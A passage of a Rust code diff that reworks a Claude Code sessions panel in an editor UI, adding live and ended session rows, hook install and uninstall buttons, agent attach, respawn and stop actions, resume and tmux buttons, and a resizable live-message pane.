+        let notice = store.notice().cloned();
+        let agents_unavailable = store.agents_unavailable_reason().cloned();
+        let liveness_unavailable = store.liveness_unavailable_reason().cloned();
+        let stale = store
+            .stale_for(now_millis().max(0) as u64)
+            .map(|(which, overdue_ms)| {
+                SharedString::from(format!("stale: {which} {} s", overdue_ms / 1000))
             });
-        let summary = collapsed_sessions_summary(sessions.len(), selected_name.as_deref());
-        // Offered only once there is a machine to install onto: with no session listed,
-        // nothing has said which machine the button would be for.
-        let offer_question_hook = !store.question_hook_installed() && !sessions.is_empty();
+        let ai_title = store.main_transcript().ai_title();
+        let selected_name = rows.iter().find_map(|row| {
+            (Some(row.session_id()) == selected.as_deref()).then(|| match row {
+                SessionRow::Live(live) => preferred_session_name(&live.session, ai_title),
+                SessionRow::Ended(ended) => preferred_name(
+                    ended.ai_title.as_deref(),
+                    ended.name.as_deref(),
+                    ended.session_id.as_str(),
+                ),
+            })
+        });
+        let summary = collapsed_sessions_summary(rows.len(), selected_name.as_deref());
+        let hooks_installed = store.hooks_installed();
+        let offer_hooks = !hooks_installed && !rows.is_empty();
         let is_expanded = self.session_list_expanded;
-        // Built while the store is borrowed and before any click handler is, because a
-        // read of the store and the `cx.listener` calls below cannot be held at once. The
-        // conversation the agent states are judged against is walked once for the whole
-        // list rather than once per row, and it is the selected session's, which is why
-        // no other session's agents are judged against it.
         let agent_rows: Vec<Vec<SessionAgentRow>> = {
             let store = self.store.read(cx);
             let open_target = store.transcript_target().clone();
             let main_transcript = store.main_transcript();
             let main_path = main_transcript.active_path();
-            // Only the followed session's conversation is read, and a background shell is
-            // recorded nowhere else, so every other session's row list has none — which
-            // is the same way `main_path` is withheld from them below.
             let shells = background_shells(&main_transcript.full_path());
-            sessions
-                .iter()
-                .map(|session| {
-                    let is_selected = selected_process_id == Some(session.process_id);
-                    let main_path: &[&TranscriptRecord] =
-                        if is_selected { &main_path } else { &[] };
-                    let shells: &[BackgroundShell] = if is_selected { &shells } else { &[] };
-                    session_agent_rows(
-                        store.subagents_of(&session.session_id),
-                        shells,
-                        main_path,
-                        &open_target,
-                    )
+            rows.iter()
+                .map(|row| match row {
+                    SessionRow::Live(live) => {
+                        let is_selected =
+                            selected.as_deref() == Some(live.session.session_id.as_str());
+                        let main_path: &[&TranscriptRecord] =
+                            if is_selected { &main_path } else { &[] };
+                        let shells: &[BackgroundShell] = if is_selected { &shells } else { &[] };
+                        session_agent_rows(
+                            store.subagents_of(&live.session.session_id),
+                            shells,
+                            main_path,
+                            &open_target,
+                        )
+                    }
+                    SessionRow::Ended(_) => Vec::new(),
                 })
                 .collect()
         };
 
         v_flex()
+            .size_full()
             .child(
                 h_flex()
                     .p_1()
@@ -2658,25 +3584,48 @@ impl ClaudeSessionsPanel {
                                     .color(Color::Muted)
                                     .single_line(),
                             )
-                            .when(offer_question_hook, |this| {
+                            .when_some(stale, |this, stale| {
+                                this.child(
+                                    Label::new(stale)
+                                        .size(LabelSize::XSmall)
+                                        .color(Color::Warning)
+                                        .single_line(),
+                                )
+                            })
+                            .when(offer_hooks, |this| {
                                 this.child(
                                     Button::new(
-                                        "claude-sessions-install-question-hook",
-                                        "Enable questions",
+                                        "claude-sessions-install-hooks",
+                                        "Install hooks",
                                     )
                                     .label_size(LabelSize::XSmall)
                                     .style(ButtonStyle::Tinted(TintColor::Accent))
                                     .tooltip(Tooltip::text(
-                                        "A question a session is waiting on is written \
-                                         nowhere until it has been answered. This adds a \
-                                         hook that records them, so they can be answered \
-                                         here. Your settings are copied aside first.",
+                                        "Installs the event dispatcher and status line \
+                                         wrapper Claude Code runs. Your settings are \
+                                         copied aside first. Sessions already running \
+                                         pick them up when they next start.",
                                     ))
                                     .on_click(
                                         cx.listener(|this, _, _, cx| {
-                                            this.install_question_hook(cx)
+                                            this.install_hooks(cx)
                                         }),
                                     ),
+                                )
+                            })
+                            .when(hooks_installed, |this| {
+                                this.child(
+                                    Button::new(
+                                        "claude-sessions-uninstall-hooks",
+                                        "Uninstall hooks",
+                                    )
+                                    .label_size(LabelSize::XSmall)
+                                    .tooltip(Tooltip::text(
+                                        "Removes Zed's Claude hooks and channel server. The MCP registration is left in place.",
+                                    ))
+                                    .on_click(cx.listener(|this, _, _, cx| {
+                                        this.uninstall_hooks(cx)
+                                    })),
                                 )
                             })
                             .when(!self.in_pane, |this| {
@@ -2705,6 +3654,40 @@ impl ClaudeSessionsPanel {
                     ),
                 )
             })
+            .when_some(notice, |this, notice| {
+                this.child(
+                    div().px_2().pb_1().child(
+                        Label::new(notice)
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted),
+                    ),
+                )
+            })
+            .when_some(agents_unavailable, |this, reason| {
+                this.child(
+                    div().px_2().pb_1().child(
+                        Label::new(reason)
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted),
+                    ),
+                )
+            })
+            .when_some(liveness_unavailable, |this, reason| {
+                this.child(
+                    div().px_2().pb_1().child(
+                        Label::new(reason)
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted),
+                    ),
+                )
+            })
+            .when_some(self.lifecycle_note.clone(), |this, note| {
+                this.child(
+                    div().px_2().pb_1().child(
+                        Label::new(note).size(LabelSize::XSmall).color(Color::Muted),
+                    ),
+                )
+            })
             .when_some(self.hook_install_note.clone(), |this, note| {
                 this.child(
                     div()
@@ -2717,9 +3700,10 @@ impl ClaudeSessionsPanel {
                 this.child(
                     v_flex()
                         .id("claude-sessions-list")
+                        .size_full()
                         .flex_1()
                         .overflow_y_scroll()
-                        .when(sessions.is_empty(), |this| {
+                        .when(rows.is_empty(), |this| {
                             this.child(
                                 div().p_2().child(
                                     Label::new(NO_SESSIONS)
@@ -2728,28 +3712,34 @@ impl ClaudeSessionsPanel {
                                 ),
                             )
                         })
-                        .children(sessions.iter().enumerate().zip(agent_rows).map(
-                            |((index, session), agents)| {
-                                let is_selected = selected_process_id == Some(session.process_id);
-                                let process_id = session.process_id;
-                                // A session with nothing to fold gets no disclosure: a
-                                // control that hides nothing reads as a claim that the
-                                // session has agents behind it.
-                                let agents_shown = (!agents.is_empty())
-                                    .then(|| !self.collapsed_session_agents.contains(&process_id));
+                        .children(rows.iter().enumerate().zip(agent_rows).map(
+                            |((index, row), agents)| {
+                                let session_id = row.session_id().to_string();
+                                let is_selected = selected.as_deref() == Some(session_id.as_str());
+                                let agents_shown = (!agents.is_empty()).then(|| {
+                                    !self.collapsed_session_agents.contains(&session_id)
+                                });
                                 v_flex()
-                                    .child(self.render_session_row(
-                                        index,
-                                        session,
-                                        is_selected,
-                                        agents_shown,
-                                        cx,
-                                    ))
+                                    .child(match row {
+                                        SessionRow::Live(live) => self.render_live_session_row(
+                                            index,
+                                            live,
+                                            is_selected,
+                                            agents_shown,
+                                            cx,
+                                        ),
+                                        SessionRow::Ended(ended) => self.render_ended_session_row(
+                                            index,
+                                            ended,
+                                            is_selected,
+                                            cx,
+                                        ),
+                                    })
                                     .children(
                                         (agents_shown == Some(true))
                                             .then(|| {
                                                 self.render_session_agent_rows(
-                                                    process_id, agents, cx,
+                                                    session_id, agents, cx,
                                                 )
                                             })
                                             .unwrap_or_default(),
@@ -2769,33 +3759,31 @@ impl ClaudeSessionsPanel {
     /// context that the click handlers need to be registered against.
     fn render_session_agent_rows(
         &self,
-        process_id: u32,
+        session_id: String,
         rows: Vec<SessionAgentRow>,
         cx: &mut Context<Self>,
     ) -> Vec<ListItem> {
         rows.into_iter()
             .enumerate()
             .map(|(index, row)| match row {
-                SessionAgentRow::WorkflowRun { label, note } => {
-                    ListItem::new(SharedString::from(format!(
-                        "claude-session-run-{process_id}-{index}"
-                    )))
-                    .spacing(ListItemSpacing::Sparse)
-                    .indent_level(1)
-                    .start_slot(
-                        Icon::new(IconName::ListTree)
-                            .size(IconSize::XSmall)
-                            .color(Color::Muted),
-                    )
-                    .child(agent_row_body(label, Some(note), Color::Default))
-                }
+                SessionAgentRow::WorkflowRun { label, note } => ListItem::new(SharedString::from(
+                    format!("claude-session-run-{session_id}-{index}"),
+                ))
+                .spacing(ListItemSpacing::Sparse)
+                .indent_level(1)
+                .start_slot(
+                    Icon::new(IconName::ListTree)
+                        .size(IconSize::XSmall)
+                        .color(Color::Muted),
+                )
+                .child(agent_row_body(label, Some(note), Color::Default)),
                 SessionAgentRow::Agent {
                     label,
                     note,
                     indent_level,
                     target,
                 } => ListItem::new(SharedString::from(format!(
-                    "claude-session-agent-{process_id}-{index}"
+                    "claude-session-agent-{session_id}-{index}"
                 )))
                 .spacing(ListItemSpacing::Sparse)
                 .indent_level(indent_level)
@@ -2804,53 +3792,83 @@ impl ClaudeSessionsPanel {
                         .size(IconSize::XSmall)
                         .color(Color::Muted),
                 )
-                .on_click(cx.listener(move |this, _, window, cx| {
-                    this.reveal_in_pane(Some(process_id), target.clone(), window, cx)
-                }))
+                .on_click({
+                    let session_id = session_id.clone();
+                    cx.listener(move |this, _, window, cx| {
+                        this.reveal_in_pane(Some(session_id.clone()), target.clone(), window, cx)
+                    })
+                })
                 .child(agent_row_body(label, note, Color::Muted)),
-                SessionAgentRow::Shell { label, note } => {
-                    ListItem::new(SharedString::from(format!(
-                        "claude-session-shell-{process_id}-{index}"
-                    )))
-                    .spacing(ListItemSpacing::Sparse)
-                    .indent_level(1)
-                    .start_slot(
-                        Icon::new(IconName::Terminal)
-                            .size(IconSize::XSmall)
-                            .color(Color::Muted),
-                    )
-                    .child(agent_row_body(label, Some(note), Color::Muted))
-                }
+                SessionAgentRow::Shell { label, note } => ListItem::new(SharedString::from(
+                    format!("claude-session-shell-{session_id}-{index}"),
+                ))
+                .spacing(ListItemSpacing::Sparse)
+                .indent_level(1)
+                .start_slot(
+                    Icon::new(IconName::Terminal)
+                        .size(IconSize::XSmall)
+                        .color(Color::Muted),
+                )
+                .child(agent_row_body(label, Some(note), Color::Muted)),
             })
             .collect()
     }
 
-    fn render_session_row(
+    fn render_live_session_row(
         &self,
         index: usize,
-        session: &RegisteredSession,
+        live: &LiveSession,
         is_selected: bool,
         // `Some` when the session has agent rows under it, saying whether they are
         // showing; `None` when it has none and so nothing to fold away.
         agents_shown: Option<bool>,
         cx: &mut Context<Self>,
     ) -> ListItem {
+        let session = &live.session;
+        let session_id = session.session_id.clone();
         let process_id = session.process_id;
-        let is_busy = session.status.as_deref() == Some("busy");
-        let name = SharedString::from(
-            session
-                .name
-                .clone()
-                .unwrap_or_else(|| session.session_id.clone()),
-        );
-        let working_directory = self.display_working_directory(&session.working_directory);
-        // What the session is carrying and what it has cost, read from the end of its own
-        // transcript rather than from the one the panel is following — every row is a
-        // different session, and only one of them is the one being read.
-        let spend = self.store.read(cx).session_spend(process_id);
-        let context = spend.filter(|spend| spend.context_tokens > 0).map(|spend| {
-            SharedString::from(format!("{} ctx", compact_token_count(spend.context_tokens)))
+        let waiting_for = live.waiting_for.clone();
+        let background = live.background;
+        let agent_id = live.agent_id.clone();
+        let tmux_target = session.tmux_target.clone();
+        let cwd = session.working_directory.clone();
+        let (is_busy, is_waiting, context_percent, claude_ai_url) = {
+            let store = self.store.read(cx);
+            let waiting = is_selected
+                && (store.live().pending_permission.is_some()
+                    || store.live().pending_question.is_some());
+            let running = is_selected && matches!(store.live().turn, Turn::Running { .. });
+            let is_busy = running || session.status.as_deref() == Some("busy");
+            let context_percent = is_selected
+                .then(|| {
+                    store
+                        .status()
+                        .and_then(|status| status.context_used_percentage)
+                })
+                .flatten();
+            let claude_ai_url = claude_ai_session_url(
+                store
+                    .main_transcript()
+                    .bridge_session_id()
+                    .filter(|_| is_selected)
+                    .or(session.bridge_session_id.as_deref()),
+            );
+            (is_busy, waiting, context_percent, claude_ai_url)
+        };
+        let selected_title = is_selected.then(|| {
+            self.store
+                .read(cx)
+                .main_transcript()
+                .ai_title()
+                .map(str::to_string)
         });
+        let name = SharedString::from(preferred_session_name(
+            session,
+            selected_title.as_ref().and_then(|title| title.as_deref()),
+        ));
+        let working_directory = self.display_working_directory(&session.working_directory);
+        let spend = self.store.read(cx).session_spend(&session.session_id);
+        let context = context_percent.map(|percent| SharedString::from(format!("{percent:.0}%")));
         let cost = spend
             .and_then(|spend| spend.total_cost_usd)
             .map(|total| SharedString::from(format_usd(total)));
@@ -2871,14 +3889,15 @@ impl ClaudeSessionsPanel {
         // Wrapped so that the pulse can be applied to the element: the icon itself
         // carries a colour rather than an opacity.
         let indicator = div().child(Icon::new(IconName::Indicator).size(IconSize::XSmall).color(
-            if is_busy {
+            if is_waiting {
+                Color::Warning
+            } else if is_busy {
                 Color::Success
             } else {
                 Color::Hidden
             },
         ));
-        // A still dot says a session is busy; a pulsing one says it is busy right now.
-        let indicator = if is_busy {
+        let indicator = if is_busy || is_waiting {
             indicator
                 .with_animation(
                     SharedString::from(format!("claude-session-indicator-{index}")),
@@ -2902,9 +3921,12 @@ impl ClaudeSessionsPanel {
                     SharedString::from(format!("claude-session-agents-{index}")),
                     shown,
                 )
-                .on_click(cx.listener(move |this, _, _, cx| {
-                    this.toggle_session_agents(process_id, cx)
-                }))
+                .on_click({
+                    let session_id = session_id.clone();
+                    cx.listener(move |this, _, _, cx| {
+                        this.toggle_session_agents(session_id.clone(), cx)
+                    })
+                })
             }))
             .child(indicator);
 
@@ -2958,16 +3980,438 @@ impl ClaudeSessionsPanel {
                                     .size(LabelSize::XSmall)
                                     .color(Color::Hidden)
                                     .single_line()
+                            }))
+                            .children(waiting_for.as_ref().map(|waiting_for| {
+                                Label::new(SharedString::from(format!("waiting: {waiting_for}")))
+                                    .size(LabelSize::XSmall)
+                                    .color(Color::Warning)
+                                    .single_line()
                             })),
                     ),
             )
-            .tooltip(Tooltip::text(format!("pid {process_id}")))
-            .on_click(cx.listener(move |this, _, window, cx| {
-                this.select_session(process_id, cx);
-                // Selecting a session in the dock is asking for that session's own
-                // conversation, whichever one the dock happened to be reading.
-                this.reveal_in_pane(Some(process_id), TranscriptTarget::Main, window, cx);
+            .end_slot(self.live_row_actions(
+                index,
+                &session_id,
+                background,
+                agent_id.as_deref(),
+                tmux_target.as_deref(),
+                &cwd,
+                claude_ai_url,
+                cx,
+            ))
+            .tooltip(Tooltip::text(if process_id == 0 {
+                format!("session {session_id}")
+            } else {
+                format!("pid {process_id}")
             }))
+            .on_click({
+                let session_id = session_id.clone();
+                cx.listener(move |this, _, window, cx| {
+                    this.select_session(session_id.clone(), cx);
+                    this.reveal_in_pane(
+                        Some(session_id.clone()),
+                        TranscriptTarget::Main,
+                        window,
+                        cx,
+                    );
+                })
+            })
+    }
+
+    fn render_ended_session_row(
+        &self,
+        index: usize,
+        ended: &EndedSession,
+        is_selected: bool,
+        cx: &mut Context<Self>,
+    ) -> ListItem {
+        let session_id = ended.session_id.clone();
+        let name = SharedString::from(preferred_name(
+            ended.ai_title.as_deref(),
+            ended.name.as_deref(),
+            ended.session_id.as_str(),
+        ));
+        let working_directory = self.display_working_directory(&ended.cwd);
+        let reason = match ended.ended_reason {
+            EndedReason::ProcessGone => "ended",
+            EndedReason::Cleared => "cleared",
+        };
+        let tmux_session = ended
+            .tmux
+            .as_deref()
+            .and_then(tmux_session_name)
+            .map(|name| SharedString::from(format!("[{name}]")));
+        let cwd = ended.cwd.clone();
+        let tmux_target = ended.tmux.clone();
+        let bridge_session_id = ended.bridge_session_id.clone();
+
+        ListItem::new(SharedString::from(format!("claude-session-ended-{index}")))
+            .spacing(ListItemSpacing::Sparse)
+            .toggle_state(is_selected)
+            .start_slot(
+                Icon::new(IconName::Close)
+                    .size(IconSize::XSmall)
+                    .color(Color::Muted),
+            )
+            .child(
+                v_flex()
+                    .gap_0p5()
+                    .overflow_hidden()
+                    .child(
+                        h_flex()
+                            .gap_1()
+                            .children(tmux_session.map(|tmux_session| {
+                                Label::new(tmux_session)
+                                    .size(LabelSize::Small)
+                                    .color(Color::Muted)
+                                    .single_line()
+                            }))
+                            .child(Label::new(name).size(LabelSize::Small).single_line())
+                            .child(
+                                Label::new(reason)
+                                    .size(LabelSize::XSmall)
+                                    .color(Color::Muted)
+                                    .single_line(),
+                            ),
+                    )
+                    .child(
+                        Label::new(working_directory)
+                            .size(LabelSize::XSmall)
+                            .color(Color::Muted)
+                            .single_line(),
+                    ),
+            )
+            .end_slot(self.ended_row_actions(
+                index,
+                &session_id,
+                &cwd,
+                tmux_target.as_deref(),
+                bridge_session_id.as_deref(),
+                cx,
+            ))
+            .on_click({
+                let session_id = session_id.clone();
+                cx.listener(move |this, _, window, cx| {
+                    this.select_session(session_id.clone(), cx);
+                    this.reveal_in_pane(
+                        Some(session_id.clone()),
+                        TranscriptTarget::Main,
+                        window,
+                        cx,
+                    );
+                })
+            })
+    }
+
+    fn live_row_actions(
+        &self,
+        index: usize,
+        _session_id: &str,
+        background: bool,
+        agent_id: Option<&str>,
+        tmux_target: Option<&str>,
+        cwd: &Path,
+        claude_ai_url: Option<String>,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let stop_armed = agent_id.is_some_and(|agent_id| self.stop_is_armed(agent_id));
+        h_flex()
+            .gap_0p5()
+            .children(claude_ai_url.map(|url| {
+                IconButton::new(
+                    SharedString::from(format!("claude-session-open-ai-{index}")),
+                    IconName::ArrowUpRight,
+                )
+                .icon_size(IconSize::XSmall)
+                .tooltip(Tooltip::text("Open in claude.ai"))
+                .on_click(move |_, _, cx| {
+                    cx.open_url(&url);
+                })
+            }))
+            .children(tmux_target.and_then(tmux_session_name).map(|name| {
+                let name = name.to_string();
+                Button::new(
+                    SharedString::from(format!("claude-session-open-tmux-{index}")),
+                    "Open in tmux",
+                )
+                .label_size(LabelSize::XSmall)
+                .on_click(cx.listener(move |this, _, window, cx| {
+                    this.spawn_in_terminal(
+                        format!("tmux: {name}"),
+                        tmux_attach_command(&name, None),
+                        None,
+                        window,
+                        cx,
+                    );
+                }))
+            }))
+            .when(background, |this| {
+                this.children(agent_id.map(|agent_id| {
+                    let agent_id = agent_id.to_string();
+                    let cwd = cwd.to_path_buf();
+                    h_flex()
+                        .gap_0p5()
+                        .child(
+                            Button::new(
+                                SharedString::from(format!("claude-session-attach-{index}")),
+                                "Attach",
+                            )
+                            .label_size(LabelSize::XSmall)
+                            .on_click({
+                                let agent_id = agent_id.clone();
+                                let cwd = cwd.clone();
+                                cx.listener(move |this, _, window, cx| {
+                                    let Some(command) = attach_command(&agent_id) else {
+                                        this.lifecycle_note = Some(SharedString::from(format!(
+                                            "{agent_id} is not an id this can attach to."
+                                        )));
+                                        cx.notify();
+                                        return;
+                                    };
+                                    this.spawn_in_terminal(
+                                        command.clone(),
+                                        command,
+                                        Some(cwd.clone()),
+                                        window,
+                                        cx,
+                                    );
+                                })
+                            }),
+                        )
+                        .child(
+                            Button::new(
+                                SharedString::from(format!("claude-session-respawn-{index}")),
+                                "Respawn",
+                            )
+                            .label_size(LabelSize::XSmall)
+                            .on_click({
+                                let agent_id = agent_id.clone();
+                                let cwd = cwd.clone();
+                                cx.listener(move |this, _, _, cx| {
+                                    this.run_agent_command(
+                                        vec!["respawn".to_string(), agent_id.clone()],
+                                        cwd.clone(),
+                                        cx,
+                                    );
+                                })
+                            }),
+                        )
+                        .child(
+                            Button::new(
+                                SharedString::from(format!("claude-session-stop-{index}")),
+                                if stop_armed { "Confirm stop" } else { "Stop" },
+                            )
+                            .label_size(LabelSize::XSmall)
+                            .on_click(cx.listener(
+                                move |this, _, _, cx| {
+                                    this.arm_or_stop(agent_id.clone(), cwd.clone(), cx);
+                                },
+                            )),
+                        )
+                }))
+            })
+            .into_any_element()
+    }
+
+    fn ended_row_actions(
+        &self,
+        index: usize,
+        session_id: &str,
+        cwd: &Path,
+        tmux_target: Option<&str>,
+        bridge_session_id: Option<&str>,
+        cx: &mut Context<Self>,
+    ) -> AnyElement {
+        let claude_ai_url = self.claude_ai_url_for(session_id, bridge_session_id, cx);
+        h_flex()
+            .gap_0p5()
+            .child({
+                let session_id = session_id.to_string();
+                let cwd = cwd.to_path_buf();
+                Button::new(
+                    SharedString::from(format!("claude-session-resume-{index}")),
+                    "Resume",
+                )
+                .label_size(LabelSize::XSmall)
+                .on_click(cx.listener(move |this, _, _, cx| {
+                    this.resume_ended_session(session_id.clone(), cwd.clone(), cx);
+                }))
+            })
+            .children(claude_ai_url.map(|url| {
+                Button::new(
+                    SharedString::from(format!("claude-session-ended-open-ai-{index}")),
+                    "Open in claude.ai",
+                )
+                .label_size(LabelSize::XSmall)
+                .on_click(move |_, _, cx| {
+                    cx.open_url(&url);
+                })
+            }))
+            .children(tmux_target.and_then(tmux_session_name).map(|name| {
+                let name = name.to_string();
+                Button::new(
+                    SharedString::from(format!("claude-session-ended-tmux-{index}")),
+                    "Open in tmux",
+                )
+                .label_size(LabelSize::XSmall)
+                .on_click(cx.listener(move |this, _, window, cx| {
+                    this.spawn_in_terminal(
+                        format!("tmux: {name}"),
+                        tmux_attach_command(&name, None),
+                        None,
+                        window,
+                        cx,
+                    );
+                }))
+            }))
+            .child({
+                let session_id = session_id.to_string();
+                Button::new(
+                    SharedString::from(format!("claude-session-dismiss-{index}")),
+                    "Dismiss",
+                )
+                .label_size(LabelSize::XSmall)
+                .on_click(cx.listener(move |this, _, _, cx| {
+                    this.store
+                        .update(cx, |store, cx| store.dismiss_ended(&session_id, cx));
+                    cx.notify();
+                }))
+            })
+            .into_any_element()
+    }
+
+    fn claude_ai_url_for(
+        &self,
+        session_id: &str,
+        registry_bridge: Option<&str>,
+        cx: &App,
+    ) -> Option<String> {
+        let store = self.store.read(cx);
+        let from_transcript = (store.selected() == Some(session_id))
+            .then(|| store.main_transcript().bridge_session_id())
+            .flatten();
+        claude_ai_session_url(registry_bridge.or(from_transcript))
+    }
+
+    #[cfg(test)]
+    fn ended_row_action_labels(ended: &EndedSession) -> Vec<&'static str> {
+        let mut labels = vec!["Resume"];
+        if ended
+            .bridge_session_id
+            .as_deref()
+            .is_some_and(|id| !id.trim().is_empty())
+        {
+            labels.push("Open in claude.ai");
+        }
+        if ended.tmux.as_deref().and_then(tmux_session_name).is_some() {
+            labels.push("Open in tmux");
+        }
+        labels.push("Dismiss");
+        labels
+    }
+
+    #[cfg(test)]
+    fn background_row_action_labels(live: &LiveSession) -> Vec<&'static str> {
+        if !live.background || live.agent_id.is_none() {
+            return Vec::new();
+        }
+        vec!["Attach", "Respawn", "Stop"]
+    }
+
+    fn stop_is_armed(&self, agent_id: &str) -> bool {
+        self.stop_armed_until_ms
+            .as_ref()
+            .is_some_and(|(id, until)| id == agent_id && now_millis() < *until)
+    }
+
+    fn arm_or_stop(&mut self, agent_id: String, cwd: PathBuf, cx: &mut Context<Self>) {
+        if self.stop_is_armed(&agent_id) {
+            self.stop_armed_until_ms = None;
+            self.run_agent_command(vec!["stop".to_string(), agent_id], cwd, cx);
+            return;
+        }
+        self.stop_armed_until_ms = Some((agent_id, now_millis().saturating_add(STOP_ARM_MS)));
+        cx.notify();
+    }
+
+    fn resume_ended_session(&mut self, session_id: String, cwd: PathBuf, cx: &mut Context<Self>) {
+        let resume = self.source.resume_session_in_background(session_id, cwd);
+        self._lifecycle_command = cx.spawn(async move |this, cx| {
+            let result = resume.await;
+            this.update(cx, |this, cx| {
+                this.lifecycle_note = Some(match result {
+                    Ok(output) => SharedString::from(output),
+                    Err(error) => SharedString::from(format!("Resume failed: {error:#}")),
+                });
+                cx.notify();
+            })
+            .log_err();
+        });
+    }
+
+    fn run_agent_command(&mut self, args: Vec<String>, cwd: PathBuf, cx: &mut Context<Self>) {
+        let run = self.source.run_claude_agent_command(args, cwd);
+        self._lifecycle_command = cx.spawn(async move |this, cx| {
+            let result = run.await;
+            this.update(cx, |this, cx| {
+                this.lifecycle_note = Some(match result {
+                    Ok(output) => SharedString::from(output),
+                    Err(error) => SharedString::from(format!("{error:#}")),
+                });
+                cx.notify();
+            })
+            .log_err();
+        });
+    }
+
+    fn spawn_in_terminal(
+        &mut self,
+        label: String,
+        command: String,
+        cwd: Option<PathBuf>,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        let Some(workspace) = self.workspace.upgrade() else {
+            self.lifecycle_note = Some(SharedString::from("The workspace is not available."));
+            cx.notify();
+            return;
+        };
+        let Some(terminal_panel) = workspace.read(cx).panel::<TerminalPanel>(cx) else {
+            self.lifecycle_note = Some(SharedString::from("The terminal panel is not available."));
+            cx.notify();
+            return;
+        };
+
+        let spawn = SpawnInTerminal {
+            id: TaskId(format!("claude-session-{label}")),
+            full_label: label.clone(),
+            label,
+            command: Some(command.clone()),
+            command_label: command,
+            use_new_terminal: true,
+            allow_concurrent_runs: true,
+            reveal: RevealStrategy::Always,
+            cwd,
+            ..Default::default()
+        };
+        let spawned = terminal_panel.update(cx, |terminal_panel, cx| {
+            terminal_panel.spawn_task(&spawn, window, cx)
+        });
+        self._lifecycle_command = cx.spawn(async move |this, cx| {
+            if let Err(error) = spawned.await {
+                this.update(cx, |this, cx| {
+                    this.lifecycle_note =
+                        Some(SharedString::from(format!("Opening a terminal: {error:#}")));
+                    cx.notify();
+                })
+                .log_err();
+            }
+        });
+    }
+
+    fn set_store_visible(&mut self, visible: bool, cx: &mut Context<Self>) {
+        self.store.update(cx, |store, _| store.set_visible(visible));
     }
 
     /// The row of conversations the selected session has to offer: its own, then one chip
@@ -3004,8 +4448,13 @@ impl ClaudeSessionsPanel {
                 .collect();
             (subagents, target, states, shells)
         };
+        let pending_agents = self.pending_background_agents().unwrap_or(0);
 
-        if subagents.is_empty() && shells.is_empty() && target == TranscriptTarget::Main {
+        if subagents.is_empty()
+            && shells.is_empty()
+            && pending_agents == 0
+            && target == TranscriptTarget::Main
+        {
             return None;
         }
 
@@ -3060,6 +4509,18 @@ impl ClaudeSessionsPanel {
                 None,
                 cx,
             ));
+        }
+
+        if pending_agents > 0 {
+            row = row.child(
+                Label::new(if pending_agents == 1 {
+                    SharedString::from("1 agent still running")
+                } else {
+                    SharedString::from(format!("{pending_agents} agents still running"))
+                })
+                .size(LabelSize::XSmall)
+                .color(Color::Muted),
+            );
         }
 
         Some(row.into_any_element())
@@ -3229,26 +4690,30 @@ impl ClaudeSessionsPanel {
     /// times a second while the turn runs, and an entry in the list would remeasure the
     /// whole conversation each time.
     fn render_live_message(
-        &self,
+        &mut self,
         window: &mut Window,
         cx: &mut Context<Self>,
     ) -> Option<AnyElement> {
-        let store = self.store.read(cx);
-        // An agent's conversation is read from its own file and streams nowhere, so this
-        // would be the session talking under an agent's transcript.
-        if !matches!(store.transcript_target(), TranscriptTarget::Main) {
+        let now_ms = now_millis();
+        let (is_main, visible, message_id, text, is_final) = {
+            let store = self.store.read(cx);
+            let is_main = matches!(store.transcript_target(), TranscriptTarget::Main);
+            let live = store.live();
+            let visible = is_main && live_message_is_visible(live, now_ms);
+            let message = live.live_message.as_ref();
+            (
+                is_main,
+                visible,
+                message.and_then(|message| message.message_id.clone()),
+                message.map(|message| message.text.clone()),
+                message.is_some_and(|message| message.is_final),
+            )
+        };
+        if !is_main || !visible {
+            self.forget_live_message_markdown();
             return None;
         }
-
-        let live = store.live_message()?;
-        let live = live.trim();
-        if live.is_empty() {
-            return None;
-        }
-
-        // Once the turn is over the same words arrive in the conversation as a record of
-        // their own, and drawing both would show the message twice. Only the newest few
-        // entries are checked: the words arrive at the end or not at all.
+        let text = text?;
         let already_in_the_conversation = self.entries.iter().rev().take(8).any(|entry| {
             matches!(
                 &entry.kind,
@@ -3256,41 +4721,75 @@ impl ClaudeSessionsPanel {
                     role: MessageRole::Assistant,
                     source,
                     ..
-                } if source.trim() == live
+                } if source.trim() == text.trim()
             )
         });
         if already_in_the_conversation {
+            self.forget_live_message_markdown();
             return None;
         }
+
+        let markdown_key = live_message_markdown_key(message_id.as_deref());
+        if self.live_message_markdown_key.as_ref() != Some(&markdown_key) {
+            self.forget_live_message_markdown();
+            self.live_message_markdown_key = Some(markdown_key.clone());
+        }
+        let source = SharedString::from(text);
+        let markdown = self.markdown_for(&markdown_key, source, cx);
+        let header = if is_final { "Said" } else { "Saying…" };
+        let header_color = if is_final {
+            Color::Muted
+        } else {
+            Color::Default
+        };
+        let height = clamp_live_message_height(
+            self.live_message_height,
+            window.rem_size(),
+            window.bounds().size.height,
+        );
+        self.live_message_height = height;
 
         Some(
             v_flex()
                 .w_full()
-                .px_2()
-                .py_1()
-                .gap_0p5()
+                .flex_none()
+                .h(height)
+                .max_h(relative(LIVE_MESSAGE_HEIGHT_PANEL_FRACTION))
                 .border_t_1()
                 .border_color(cx.theme().colors().border)
+                .on_drag_move::<DraggedLiveMessageDivider>(cx.listener(
+                    |this, event, window, cx| this.on_live_message_drag_move(event, window, cx),
+                ))
+                .on_drop::<DraggedLiveMessageDivider>(cx.listener(|this, _, _, cx| {
+                    this.live_message_drag = None;
+                    cx.notify();
+                }))
                 .child(
-                    Label::new("Saying now")
-                        .size(LabelSize::XSmall)
-                        .color(Color::Muted),
+                    div()
+                        .id("claude-session-live-message-resize")
+                        .w_full()
+                        .h_1()
+                        .cursor_row_resize()
+                        .on_drag(DraggedLiveMessageDivider, |_, _, _, cx| cx.new(|_| Empty)),
                 )
-                // Capped rather than left to grow: a turn can spend a minute writing one
-                // message, and an uncapped box pushes the conversation it belongs under
-                // off the screen. What does not fit is scrolled to, which is also how the
-                // reader reaches the start of a message whose end they are being shown.
+                .child(
+                    div().px_2().child(
+                        Label::new(header)
+                            .size(LabelSize::XSmall)
+                            .color(header_color),
+                    ),
+                )
                 .child(
                     div()
                         .id("claude-session-live-message")
                         .w_full()
-                        .max_h(rems(LIVE_MESSAGE_MAX_HEIGHT_REMS))
+                        .flex_1()
+                        .min_h_0()
+                        .px_2()
+                        .pb_1()
                         .overflow_y_scroll()
                         .track_scroll(&self.live_message_scroll)
-                        .child(
-                            Label::new(SharedString::from(live.to_string()))
